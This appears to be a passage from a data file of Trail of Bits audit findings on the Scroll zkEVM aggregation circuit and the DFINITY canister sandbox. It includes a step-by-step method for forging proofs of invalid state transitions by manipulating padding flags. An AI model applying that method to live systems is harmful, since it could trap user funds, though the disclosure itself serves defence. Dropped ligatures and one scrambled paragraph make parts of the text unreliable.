value indicating whether and a sequence of validity   is a ags ,...,   , where each  1   proof for a valid chunk or a padding chunk. Each must be a correct SNARK, but dierent   rules are enforced on the public inputs of valid and padding chunks. Valid chunks after the rst one must be continuous with the previous chunk, while padding chunks after the rst one must have exactly equal public inputs to the previous chunk. These checks are shown in gures 10.1 and 10.2. // 4 __valid__ chunks are continuous: they are linked via the state roots for i in 0..MAX_AGG_SNARKS - 1 { for j in 0..DIGEST_LEN {  rlc_config.conditional_enforce_equal( &mut region, &chunk_pi_hash_preimages[i + 1][PREV_STATE_ROOT_INDEX + j], &chunk_pi_hash_preimages[i][POST_STATE_ROOT_INDEX + j], &chunk_is_valid_cells[i + 1], &mut offset, )?; } } Figure 10.1: aggregator/src/core.rs#666690 // 6. chunk[i]'s chunk_pi_hash_rlc_cells == chunk[i-1].chunk_pi_hash_rlc_cells when // chunk[i] is padded let chunks_are_padding = chunk_is_valid_cells .iter() .map(|chunk_is_valid| rlc_config.not(&mut region, chunk_is_valid, &mut offset)) .collect::<Result<Vec<_>, halo2_proofs::plonk::Error>>()?; let chunk_pi_hash_rlc_cells = parse_pi_hash_rlc_cells(data_rlc_cells); for i in 1..MAX_AGG_SNARKS { rlc_config.conditional_enforce_equal( &mut region, chunk_pi_hash_rlc_cells[i - 1], chunk_pi_hash_rlc_cells[i], &chunks_are_padding[i], &mut offset, )?; } Figure 10.2: aggregator/src/core.rs#692709  The README section shown in gure 10.3 suggests that, for some situations in which    the rst not explicitly enforced by the aggregation circuit, and both attacks rely on manipulation of the validity ags. chunks will be padding; however, this is chunks will be valid and the last  > 1 , 4. chunks are continuous when they are not padded: they are linked via the state roots. ``` for i in 1 ... k-1 c_i.post_state_root == c_{i+1}.prev_state_root ``` 5. All the chunks use a same chain id. __Static__. ``` for i in 1 ... n batch.chain_id == chunk[i].chain_id ``` 6. The last `(n-k)` chunk[i] are padding ``` for i in 1 ... n: if is_padding: chunk[i]'s chunk_pi_hash_rlc_cells == chunk[i-1].chunk_pi_hash_rlc_cells ``` Figure 10.3: aggregator/README.md#102120 Attack 1 involves setting all   ags to 0 and setting all chunks to A. When that occurs, all batch public input elds other than chain_id and batch_data_hash will be calculated from A, as shown in gure 10.4. for i in 0..DIGEST_LEN { // 2.1 chunk[0].prev_state_root    } region.constrain_equal( batch_pi_hash_preimage[i + PREV_STATE_ROOT_INDEX].cell(), chunk_pi_hash_preimages[0][i + PREV_STATE_ROOT_INDEX].cell(), )?; // 2.2 chunk[k-1].post_state_root region.constrain_equal( batch_pi_hash_preimage[i + POST_STATE_ROOT_INDEX].cell(), chunk_pi_hash_preimages[MAX_AGG_SNARKS - 1][i + POST_STATE_ROOT_INDEX] .cell(), )?; // 2.3 chunk[k-1].withdraw_root region.constrain_equal( batch_pi_hash_preimage[i + WITHDRAW_ROOT_INDEX].cell(), chunk_pi_hash_preimages[MAX_AGG_SNARKS - 1][i + WITHDRAW_ROOT_INDEX].cell(), )?; Figure 10.4: aggregator/src/core.rs#355406 The cells in potential_batch_data_hash_preimage will not be constrained to be equal to any of the chunk data_hash elds, as shown in gure 10.5. for i in 0..MAX_AGG_SNARKS { for j in 0..DIGEST_LEN {  rlc_config.conditional_enforce_equal( &mut region, &chunk_pi_hash_preimages[i][j + CHUNK_DATA_HASH_INDEX], &potential_batch_data_hash_preimage[i * DIGEST_LEN + j], &chunk_is_valid_cells[i], &mut offset, )?; } } Figure 10.5: aggregator/src/core.rs#642664 num_valid_snarks will equal 0, and the hash-selection ags will be (1,0,0), as shown in gure 10.6. let flag1 = rlc_config.is_smaller_than( &mut region, &num_valid_snarks, &five, &mut offset, )?; let not_flag1 = rlc_config.not(&mut region, &flag1, &mut offset)?; let not_flag3 = rlc_config.is_smaller_than( &mut region, &num_valid_snarks, &nine, &mut offset, )?; let flag3 = rlc_config.not(&mut region, &not_flag3, &mut offset)?; let flag2 = rlc_config.mul(&mut region, &not_flag1, &not_flag3, &mut offset)?; Figure 10.6: aggregator/src/core.rs#524538 The calculated input length will be 0, and the length eld of the rst row of the batch_data_hash section will be 0, as shown in gure 10.7. let data_hash_inputs_len = rlc_config.mul(&mut region, &num_valid_snarks, &const32, &mut offset)?;  let mut data_hash_inputs_len_rec = rlc_config.mul( &mut region, &hash_input_len_cells[MAX_AGG_SNARKS * 2 + 3], &flag1, &mut offset, )?; data_hash_inputs_len_rec = rlc_config.mul_add( &mut region, &hash_input_len_cells[MAX_AGG_SNARKS * 2 + 4], &flag2, &data_hash_inputs_len_rec, &mut offset, )?; data_hash_inputs_len_rec = rlc_config.mul_add( &mut region, &hash_input_len_cells[MAX_AGG_SNARKS * 2 + 5], &flag3, &data_hash_inputs_len_rec, &mut offset, )?;  region.constrain_equal( data_hash_inputs_len.cell(), data_hash_inputs_len_rec.cell(), )?; Figure 10.7: aggregator/src/core.rs#744804 Based on the ags and the calculated input length, the batch data hash will be the Keccak hash of an empty sequence, as determined by the constraints in gure 10.8. let rhs = rlc_config.mul( &mut region, &flag1, &potential_batch_data_hash_digest[(3 - i) * 8 + j], &mut offset, )?; let rhs = rlc_config.mul_add( &mut region, &flag2, &potential_batch_data_hash_digest[(3 - i) * 8 + j + 32], &rhs, &mut offset, )?; let rhs = rlc_config.mul_add( &mut region, &flag3, &potential_batch_data_hash_digest[(3 - i) * 8 + j + 64], &rhs, &mut offset, )?; region.constrain_equal( batch_pi_hash_preimage[i * 8 + j + CHUNK_DATA_HASH_INDEX].cell(), rhs.cell(), )?; Figure 10.8: aggregator/src/core.rs#602626 The last constraint that must be satised for attack 1 to succeed is the RLC calculation, shown in gure 10.9. In theory, the RLC should be equal to 0, so the check should succeed by equaling the RLC of the rst row. However, due to nding TOB-SCROLL3-11, the calculated RLC will equal the rst byte of the batch_data_hash section, which is a padding byte equal to 1. This can be resolved by setting the second row of the batch_data_hash section, which is otherwise unused in this situation, to the one-byte sequence [1]. let rlc_cell = rlc_config.rlc_with_flag( &mut region, potential_batch_data_hash_preimage[..DIGEST_LEN * MAX_AGG_SNARKS].as_ref(), &challenge_cell, &flags, &mut offset, )?;  // assertion let t1 = rlc_config.sub( &mut region, &rlc_cell, &data_rlc_cells[MAX_AGG_SNARKS * 2 + 3], &mut offset, )?; let t2 = rlc_config.sub( &mut region, &rlc_cell, &data_rlc_cells[MAX_AGG_SNARKS * 2 + 4], &mut offset, )?; let t3 = rlc_config.sub( &mut region, &rlc_cell, &data_rlc_cells[MAX_AGG_SNARKS * 2 + 5], &mut offset, )?; let t1t2 = rlc_config.mul(&mut region, &t1, &t2, &mut offset)?; let t1t2t3 = rlc_config.mul(&mut region, &t1t2, &t3, &mut offset)?; rlc_config.enforce_zero(&mut region, &t1t2t3)?; Figure 10.9: aggregator/src/core.rs#817866 Attack 2 must pass many of the same constraints, and proceeds as follows: 1. Set the batch to [A,A,A,A,B,B,...,B] and the validity ags to [0,0,0,0,1,0,0,...,0] (i.e., the rst four chunks are padding chunks containing A, the fth chunk is a valid chunk containing B, and the remaining chunks are padding chunks containing B). 2. Set the rst row of the batch_data_hash section to evil_data_hash[0..32]. This will satisfy the constraints shown in gures 10.7 and 10.8 and will cause the batch data hash to equal keccak(evil_data_hash), the result from this row. 3. Set the second row of the batch_data_hash section to B.data_hash[0..32] to satisfy the requirements shown in gure 10.5. Set the final ag on this row to avoid interfering with the next step. 4. Set the third row of the batch_data_hash to [A.data_hash[0],B.data_hash[0],B.data_hash[1],...,B.data_hash[31]] so that the data_rlc value in this row will satisfy the constraints in gure 10.9 by matching the incorrect calculation of rlc_cell due to nding TOB-SCROLL3-11. We believe that this attack can generalize further, but due to time constraints, we did not evaluate any other cases. If nding TOB-SCROLL3-11 is resolved, the attack is still possible: steps 3 and 4 must be modied so that the third row is all zeros and the final ag is not set in the second row. Exploit Scenario Alice sends a deposit to the Scroll zkEVM L2 contract, and the L1 message for that deposit is included in a chunk that is successfully committed but not yet nalized. Bob uses attack 2 to generate a proof for an incorrect state transition and uses that proof to nalize the chunk that Alice sent. The L1 messages that would be popped by that chunk are removed from the queue with no eect, and because the chunk has been nalized, it cannot be reverted, causing Alices funds to be trapped in the Scroll L2 contract with no way of withdrawing them. Recommendations Short term, add constraints so that num_valid_snarks must be nonzero and chunk_is_valid_cells must not have any valid cells after padding chunks. Long term, specify, review, and test all security-critical logic such as the aggregation padding validation as thoroughly as possible. In particular, scrutinize any constraints that have unusual implementation patterns or could lead to any unconstrained or underconstrained cells. Although the most important x involves constraining chunk_is_valid_cells directly, attack 2 of this nding is only as severe as it is because some otherwise innocuous constraints were more exible than they strictly needed to be:  If potential_batch_data_hash_preimage cells (shown in gure 10.5) were always constrained, even for padding chunks, it would not have been possible to ll the rst row with the data from evil_data_hash.  If unused batch_data_hash rows in the Keccak table were forced to be empty, the RLC checks could not succeed during this attack; for example, by constraining all three data length elds in gure 10.7 instead of constraining only one of them, it would not have been possible to put A.data_hash in the second row.  If the RLC check in gure 10.9 explicitly selected which rows RLC should be checked using the flag variables, the rst row could not have been lled with attacker-controlled data.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "11. RlcCong::rlc_with_ag is incorrect ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "The RlcConfig::rlc_with_flag function combines a vector of eld elements and a vector of ag values with a random challenge. The documentation comment on this function, shown in gure 11.1, suggests that the ag array should act like a mask on the vector; that is, entries in the vector with a ag of 0 should be set to 0: // Returns challenge^k * inputs[0] * flag[0] + ... + challenge * inputs[k-1] * flag[k-1]] + // inputs[k]* flag[k] Figure 11.1: aggregator/src/aggregation/rlc/gates.rs#342343 The two test cases for this function, shown in gure 11.2, as well as its use in the aggregation circuit, suggest an alternate intended functionality where entries with a ag value equal to 0 are simply removed from the vector before the RLC occurs: // unit test: rlc with flags { let zero = config.load_private(&mut region, &Fr::zero(), &mut offset)?; let one = config.not(&mut region, &zero, &mut offset)?; let flag = [one.clone(), one.clone(), one.clone(), one.clone()]; let f6_rec = config.rlc_with_flag(&mut region, &inputs, &f5, &flag, &mut offset)?; region.constrain_equal(f6.cell(), f6_rec.cell())?; let flag = [one.clone(), one.clone(), one, zero]; let res = rlc(&[self.f1, self.f2, self.f3], &self.f5); let res = config.load_private(&mut region, &res, &mut offset)?; let res_rec = config.rlc_with_flag(&mut region, &inputs, &f5, &flag, &mut offset)?; region.constrain_equal(res.cell(), res_rec.cell())?; } Figure 11.2: aggregator/src/tests/rlc/gates.rs#125141 Regardless of whichever functionality is the intended one, rlc_with_flag, shown in gure 11.3, is incorrect: pub(crate) fn rlc_with_flag( &self, region: &mut Region<Fr>, inputs: &[AssignedCell<Fr, Fr>], challenge: &AssignedCell<Fr, Fr>, flags: &[AssignedCell<Fr, Fr>], offset: &mut usize, ) -> Result<AssignedCell<Fr, Fr>, Error> { assert!(flags.len() == inputs.len()); let mut acc = inputs[0].clone(); for (input, flag) in inputs.iter().zip(flags.iter()).skip(1) { let tmp = self.mul_add(region, &acc, challenge, input, offset)?; acc = self.select(region, &tmp, &acc, flag, offset)?; } Ok(acc) } Figure 11.3: aggregator/src/aggregation/rlc/gates.rs#344360 If the ags are supposed to act as a lter, only the handling of flags[0] needs to change (e.g., to the version shown in gure 11.4). pub(crate) fn rlc_with_flag( &self, region: &mut Region<Fr>, inputs: &[AssignedCell<Fr, Fr>], challenge: &AssignedCell<Fr, Fr>, flags: &[AssignedCell<Fr, Fr>], offset: &mut usize, ) -> Result<AssignedCell<Fr, Fr>, Error> { assert!(flags.len() == inputs.len()); let mut acc = self.mul(region, &inputs[0], &flags[0], offset)?; for (input, flag) in inputs.iter().zip(flags.iter()).skip(1) { let tmp = self.mul_add(region, &acc, challenge, input, offset)?; acc = self.select(region, &tmp, &acc, flag, offset)?; } Ok(acc) } Figure 11.4: A x for rlc_with_flag if the ags should act like lters If the behavior is supposed to match the documentation comment, the function should be rewritten to unconditionally multiply acc by challenge and to conditionally add input, as shown in gure 11.5. pub(crate) fn rlc_with_flag( &self, region: &mut Region<Fr>, inputs: &[AssignedCell<Fr, Fr>], challenge: &AssignedCell<Fr, Fr>, flags: &[AssignedCell<Fr, Fr>], offset: &mut usize, ) -> Result<AssignedCell<Fr, Fr>, Error> { assert!(flags.len() == inputs.len()); let mut acc = self.mul(region, &inputs[0], &flags[0], offset)?; for (input, flag) in inputs.iter().zip(flags.iter()).skip(1) { let tmp = self.mul(region, input, flag, offset)?; acc = self.mul_add(region, &acc, challenge, &tmp, offset)?; } Ok(acc) } Figure 11.5: A x for rlc_with_flag if the ags should act like masks Because this function is used only in the conditional_constraints function, the impact of this issue is minimal, and all potential issues we found would also be xed by addressing nding TOB-SCROLL3-10. Recommendations Short term, determine the correct behavior of rlc_with_flag and update the implementation to reect that behavior. Long term, test critical functions such as rlc_with_flag on as broad a set of inputs as possible. Consider adding a property-based testing framework such as proptest to test functions over a broad chunk of the input space using random inputs. The property for any vector v, rlc_with_test(v,vec![0; v.len()]) == 0 would have found this problem.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "12. Accumulator representation assumes xed-length eld limbs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "KZG accumulators are pairs of elliptic curve points and must be uniquely serialized when included in the public inputs when verifying SHPLONK proofs. This serialization is done by the flatten_accumulator function from the snark-verifier-sdk crate, as shown in gures 12.1 and 12.2. instances from previous accumulators) // extract the assigned values for // - instances which are the public inputs of each chunk (prefixed with 12 // // - new accumulator to be verified on chain // let (assigned_aggregation_instances, acc) = aggregate::<Kzg<Bn256, Bdfg21>>( &self.svk, &loader, &self.snarks_with_padding, self.as_proof(), );  // extract the following cells for later constraints // - the accumulators // - the public inputs from each snark accumulator_instances.extend(flatten_accumulator(acc).iter().copied()); // the snark is not a fresh one, assigned_instances already contains an // accumulator so we want to skip the first 12 elements from the public input snark_inputs.extend( assigned_aggregation_instances .iter() .flat_map(|instance_column| instance_column.iter().skip(ACC_LEN)), ); config.range().finalize(&mut loader.ctx_mut()); loader.ctx_mut().print_stats(&[\"Range\"]); Ok((accumulator_instances, snark_inputs)) Figure 12.1: aggregator/src/aggregation/circuit.rs#226 pub fn flatten_accumulator<'a>( accumulator: KzgAccumulator<G1Affine, Rc<Halo2Loader<'a>>>, ) -> Vec<AssignedValue<Fr>> { let KzgAccumulator { lhs, rhs } = accumulator; let lhs = lhs.into_assigned(); let rhs = rhs.into_assigned(); lhs.x .truncation .limbs .into_iter() .chain(lhs.y.truncation.limbs.into_iter()) .chain(rhs.x.truncation.limbs.into_iter()) .chain(rhs.y.truncation.limbs.into_iter()) .collect() } Figure 12.2: snark-verifier-sdk/src/aggregation.rs#4459 This function does not check or include the lengths of the truncation vectors in this serialization. This is not an active problem because, to our knowledge, the current nite eld implementations in the halo2-ecc library guarantee that truncation vectors are always a xed size. However, if halo2-ecc allows variable-length truncation vectors, it may be possible for two dierent accumulators to serialize to the same array. This should be documented as an assumption made about snark-verifier-sdk and halo2-ecc, and care should be taken when updating halo2-ecc or snark-verifier-sdk in case this behavior changes. Recommendations Short term, document this requirement and consider adding assertions to flatten_accumulator. Long term, document all serialization formats used in the aggregator implementation and ensure that those formats fulll any assumptions made about them.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "13. PlonkProof::read ignores extra entries in num_challenge ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "Due to the PlonkProof::read functions use of the zip() function shown in gure 13.1, it is possible for a single proof to be veried using two dierent Protocol values, where one has extra entries in the num_challenge eld. let (witnesses, challenges) = { let (witnesses, challenges): (Vec<_>, Vec<_>) = protocol .num_witness .iter() .zip(protocol.num_challenge.iter()) .map(|(&n, &m)| { (transcript.read_n_ec_points(n).unwrap(), transcript.squeeze_n_challenges(m)) }) .unzip(); ( ) }; witnesses.into_iter().flatten().collect_vec(), challenges.into_iter().flatten().collect_vec(), Figure 13.1: snark-verifier/src/verifier/plonk.rs#155169 This does not appear to be exploitable as is, but code calling the PlonkProof::read function should be careful not to rely on Protocol values to be unique. Recommendations Short term, replace this zip() call with zip_eq() or document this behavior of PlonkProof::read. Long term, review all calls to zip() to ensure that the calling code behaves correctly on non-equal-length inputs.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "1. Aggregated public input hash does not include coinbase or di\u0000culty ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "The public input hash of an aggregated proof represents the public inputs of all SNARKs that the proof aggregates. In the case of zkEVM chunks, the public inputs include commitments to the overall EVM states before and after the chunk and the data included in the blocks of the chunk, as illustrated by the ChunkHash struct, shown in gure 1.1. pub struct ChunkHash { /// Chain identifier pub chain_id: u64, /// state root before this chunk pub prev_state_root: H256, /// state root after this chunk pub post_state_root: H256, /// the withdraw root after this chunk pub withdraw_root: H256, /// the data hash of this chunk pub data_hash: H256, /// if the chunk is a padded chunk pub is_padding: bool, } Figure 1.1: aggregator/src/chunk.rs#1831 The data hash does not include all elds of the BlockContext struct, as shown in gure 1.2. Some elds in BlockContext, shown in gure 1.3, are included in the public input hash through other mechanisms; for example, chain_id is used directly to calculate chunk_pi_hash. However, the coinbase and difficulty elds are not included. iter::empty() // Block Values .chain(b_ctx.number.as_u64().to_be_bytes()) .chain(b_ctx.timestamp.as_u64().to_be_bytes()) .chain(b_ctx.base_fee.to_be_bytes()) .chain(b_ctx.gas_limit.to_be_bytes()) .chain(num_txs.to_be_bytes()) Figure 1.2: aggregator/src/chunk.rs#6874 pub struct BlockContext { /// The address of the miner for the block pub coinbase: Address, /// The gas limit of the block pub gas_limit: u64, /// The number of the block pub number: Word, /// The timestamp of the block pub timestamp: Word, /// The difficulty of the block pub difficulty: Word, /// The base fee, the minimum amount of gas fee for a transaction pub base_fee: Word, /// The hash of previous blocks pub history_hashes: Vec<Word>, /// The chain id pub chain_id: u64, /// Original Block from geth pub eth_block: eth_types::Block<eth_types::Transaction>, } Figure 1.3: zkevm-circuits/src/witness/block.rs#204223 The zkevm-circuits specication draft describes these elds as constants, so they do not need to be included individually in each chunks hash, but they should be committed to through some mechanism. Recommendations Short term, add coinbase and difficulty to the aggregated public input hash. Long term, develop a specication for how all chain constants such as chain_id, coinbase, and difficulty should be treated when committing to them in the system.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "10. Incorrect state transitions can be proven for any chunk by manipulating padding ags ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "Due to insucient constraints in the aggregation circuits padding logic, a malicious prover can generate two types of invalid proofs:", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "14. MAX_AGG_SNARKS values other than 10 may misbehave ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf", "body": "The aggregation circuit takes n SNARKs and aggregates them into a batch proof that proves their correctness. The value n is represented in the aggregation circuit by the constant MAX_AGG_SNARKS, which is currently set to 10. /// Max number of snarks to be aggregated in a chunk. /// If the input size is less than this, dummy snarks /// will be padded. // TODO: update me(?) pub const MAX_AGG_SNARKS: usize = 10; Figure 14.1: aggregator/src/constants.rs#5660 The implementation of the aggregation circuit is strongly coupled with a MAX_AGG_SNARKS value of 10. For instance, the layout of the batch_data_hash portion of the Keccak table expects to have exactly three rounds of the Keccak permutation. While this logic appears to work for the values 9, 10, 11, and 12, it is not obvious whether a value of 8 would cause problems. Consequently, future updates of MAX_AGG_SNARKS may require a non-trivial amount of the circuit to be rewritten. // #valid snarks | offset of data hash | flags // 1,2,3,4 // 5,6,7,8 // 9,10 | 1, 0, 0 | 0, 1, 0 | 0, 0, 1 | 0 | 32 | 64 Figure 14.2: aggregator/src/core.rs#507510 During this assessment, we treated MAX_AGG_SNARKS as a constant equal to 10, and we did not thoroughly evaluate whether the implementation behaves correctly for values other than 10. Care should be taken if MAX_AGG_SNARKS needs to be changed for any reason. Recommendations Short term, document the assumptions that each component makes about MAX_AGG_SNARKS, and add assertions to enforce those assumptions during circuit construction. Long term, evaluate the behavior of the aggregator implementation for values of MAX_AGG_SNARKS other than 10, and if other values need to be used, consider refactoring the code to use MAX_AGG_SNARKS in a generic fashion. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "1. The canister sandbox has vulnerable dependencies ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf", "body": "The canister sandbox codebase uses the following vulnerable or unmaintained Rust dependencies. (All of the crates listed are indirect dependencies of the codebase.) Dependency Version ID", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "2. Complete environment of the replica is passed to the sandboxed process ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf", "body": "When the spawn_socketed_process function spawns a new sandboxed process, the call to the Command::spawn method passes the entire environment of the replica to the sandboxed process. pub fn spawn_socketed_process( exec_path: &str, argv: &[String], socket: RawFd, ) -> std::io::Result<Child> { let mut cmd = Command::new(exec_path); cmd.args(argv); // In case of Command we inherit the current process's environment. This should // particularly include things such as Rust backtrace flags. It might be // advisable to filter/configure that (in case there might be information in // env that the sandbox process should not be privy to). // The following block duplicates sock_sandbox fd under fd 3, errors are // handled. unsafe { cmd.pre_exec(move || { let fd = libc::dup2(socket, 3); if fd != 3 { return Err(std::io::Error::last_os_error()); } Ok(()) }) }; let child_handle = cmd.spawn()?; Ok(child_handle) } Figure 2.1: canister_sandbox/common/src/process.rs:17- The DFINITY team does not use environment variables for sensitive information. However, sharing the environment with the sandbox introduces a latent risk that system conguration data or other sensitive data could be leaked to the sandboxed process in the future. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. Since the environment of the replica was leaked to the sandbox when the process was created, the canister gains information about the system that it is running on and learns sensitive information passed as environment variables to the replica, making further eorts to compromise the system easier. Recommendations Short term, add code that lters the environment passed to the sandboxed process (e.g., Command::env_clear or Command::env_remove) to ensure that no sensitive information is leaked if the sandbox is compromised.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. SELinux policy allows the sandbox process to write replica log messages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf", "body": "When a new sandboxed process is spawned using Command::spawn, the processs stdin, stdout, and stderr le descriptors are inherited from the parent process. The SELinux policy for the canister sandbox currently allows sandboxed processes to read from and write to all le descriptors inherited from the replica (the le descriptors created by init when the replica is started, as well as the le descriptor used for interprocess RPC). As a result, a compromised sandbox could spoof log messages to the replica's stdout or stderr. # Allow to use the logging file descriptor inherited from init. # This should actually not be allowed, logs should be routed through # replica. allow ic_canister_sandbox_t init_t : fd { use }; allow ic_canister_sandbox_t init_t : unix_stream_socket { read write }; Figure 3.1: guestos/rootfs/prep/ic-node/ic-node.te:312-316 Additionally, sandboxed processes read and write access to les with the tmpfs_t context appears to be overly broad, but considering the fact that sandboxed processes are not allowed to open les, we did not see any way to exploit this. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. By writing fake log messages to the replicas stderr le descriptor, the canister makes it look like the replica has other issues, masking the compromise and making incident response more dicult. Recommendations Short term, change the SELinux policy to disallow sandboxed processes from reading from and writing to the inherited le descriptors stdin, stdout, and stderr.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "4. Canister sandbox system calls are not ltered using Seccomp ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf", "body": "Seccomp provides a framework to lter outgoing system calls. Using Seccomp, a process can limit the type of system calls available to it, thereby limiting the available attack surface of the kernel. The current implementation of the canister sandbox does not use Seccomp; instead, it relies on mandatory access controls (via SELinux) to restrict the system calls available to a sandboxed process. While SELinux is useful for restricting access to les, directories, and other processes, Seccomp provides more ne-grained control over kernel system calls and their arguments. For this reason, Seccomp (in particular, Seccomp-BPF) is a useful complement to SELinux in restricting a sandboxed processs access to the system. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. By exploiting a vulnerability in the kernel, it is able to break out of the sandbox and execute arbitrary code on the node. Recommendations Long term, consider using Seccomp-BPF to restrict the system calls available to a sandboxed process. Extra care must be taken when the canister sandbox (or any of its dependencies) is updated to ensure that the set of system calls invoked during normal execution has not changed.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "5. Invalid system state changes cause the replica to panic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf", "body": "When a sandboxed process has completed an execution request, the hypervisor calls SystemStateChanges::apply_changes (in Hypervisor::execute) to apply the system state changes to the global canister system state. pub fn apply_changes(self, system_state: &mut SystemState) { // Verify total cycle change is not positive and update cycles balance. assert!(self.cycle_change_is_valid( system_state.canister_id == CYCLES_MINTING_CANISTER_ID )); self.cycles_balance_change .apply_ref(system_state.balance_mut()); // Observe consumed cycles. system_state .canister_metrics .consumed_cycles_since_replica_started += NominalCycles::from_cycles(self.cycles_consumed); // Verify we don't accept more cycles than are available from each call // context and update each call context balance if !self.call_context_balance_taken.is_empty() { let call_context_manager = system_state.call_context_manager_mut().unwrap(); for (context_id, amount_taken) in &self.call_context_balance_taken { let call_context = call_context_manager .call_context_mut(*context_id) .expect(\"Canister accepted cycles from invalid call context\"); call_context .withdraw_cycles(*amount_taken) .expect(\"Canister accepted more cycles than available ...\"); } } // Push outgoing messages. for msg in self.requests { system_state .push_output_request(msg) .expect(\"Unable to send new request\"); } // Verify new certified data isn't too long and set it. if let Some(certified_data) = self.new_certified_data.as_ref() { assert!(certified_data.len() <= CERTIFIED_DATA_MAX_LENGTH as usize); system_state.certified_data = certified_data.clone(); } // Verify callback ids and register new callbacks. for update in self.callback_updates { match update { CallbackUpdate::Register(expected_id, callback) => { let id = system_state .call_context_manager_mut() .unwrap() .register_callback(callback); assert_eq!(id, expected_id); } CallbackUpdate::Unregister(callback_id) => { let _callback = system_state .call_context_manager_mut() .unwrap() .unregister_callback(callback_id) .expect(\"Tried to unregister callback with an id ...\"); } } } } Figure 5.1: system_api/src/sandbox_safe_system_state.rs:99-157 The apply_changes method uses assert and expect to ensure that system state invariants involving cycle balances, call contexts, and callback updates are upheld. By sending a WebAssembly (Wasm) execution output with invalid system state changes, a compromised sandboxed process could use this to cause the replica to panic. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. The canister sends a Wasm execution output message containing invalid state changes to the replica, which causes the replica process to panic, crashing the entire subnet. Recommendations Short term, revise SystemStateChanges::apply_changes so that it returns an error if the system state changes from a sandboxed process are found to be invalid. Long term, audit the codebase for the use of panicking functions and macros like assert, unreachable, unwrap, or expect in code that validates data from untrusted sources.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "6. SandboxedExecutionController does not enforce memory size invariants ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf", "body": "When a sandboxed process has completed an execution request, the execution state is updated by the SandboxedExecutionController::process method with the data from the execution output. // Unless execution trapped, commit state (applying execution state // changes, returning system state changes to caller). let system_state_changes = if exec_output.wasm.wasm_result.is_ok() { if let Some(state_modifications) = exec_output.state { // TODO: If a canister has broken out of wasm then it might have allocated // more wasm or stable memory than allowed. We should add an additional // check here that the canister is still within its allowed memory usage. execution_state .wasm_memory .page_map .deserialize_delta(state_modifications.wasm_memory.page_delta); execution_state.wasm_memory.size = state_modifications.wasm_memory.size; execution_state.wasm_memory.sandbox_memory = SandboxMemory::synced( wrap_remote_memory(&sandbox_process, next_wasm_memory_id), ); execution_state .stable_memory .page_map .deserialize_delta(state_modifications.stable_memory.page_delta); execution_state.stable_memory.size = state_modifications.stable_memory.size; execution_state.stable_memory.sandbox_memory = SandboxMemory::synced( wrap_remote_memory(&sandbox_process, next_stable_memory_id), ); // ... <redacted> state_modifications.system_state_changes } else { SystemStateChanges::default() } } else { SystemStateChanges::default() }; Figure 6.1: replica_controller/src/sandboxed_execution_controller.rs:663 However, the code does not validate the Wasm and stable memory sizes against the corresponding page maps. This means that a compromised sandbox could report a Wasm or stable memory size of 0 along with a non-empty page map. Since these memory sizes are used to calculate the total memory used by the canister in ExecutionState::memory_usage, this lack of validation could allow the canister to use up cycles normally reserved for memory use. pub fn memory_usage(&self) -> NumBytes { // We use 8 bytes per global. let globals_size_bytes = 8 * self.exported_globals.len() as u64; let wasm_binary_size_bytes = self.wasm_binary.binary.len() as u64; num_bytes_try_from(self.wasm_memory.size) .expect(\"could not convert from wasm memory number of pages to bytes\") + num_bytes_try_from(self.stable_memory.size) .expect(\"could not convert from stable memory number of pages to bytes\") + NumBytes::from(globals_size_bytes) + NumBytes::from(wasm_binary_size_bytes) } Figure 6.2: replicated_state/src/canister_state/execution_state.rs:411421 Canister memory usage aects how much the cycles account manager charges the canister for resource allocation. If the canister uses best-eort memory allocation, the implementation calls through to ExecutionState::memory_usage to compute how much memory the canister is using. pub fn charge_canister_for_resource_allocation_and_usage( &self, log: &ReplicaLogger, canister: &mut CanisterState, duration_between_blocks: Duration, ) -> Result<(), CanisterOutOfCyclesError> { let bytes_to_charge = match canister.memory_allocation() { // The canister has explicitly asked for a memory allocation. MemoryAllocation::Reserved(bytes) => bytes, // The canister uses best-effort memory allocation. MemoryAllocation::BestEffort => canister.memory_usage(self.own_subnet_type), }; if let Err(err) = self.charge_for_memory( &mut canister.system_state, bytes_to_charge, duration_between_blocks, ) { } // ... <redacted> // ... 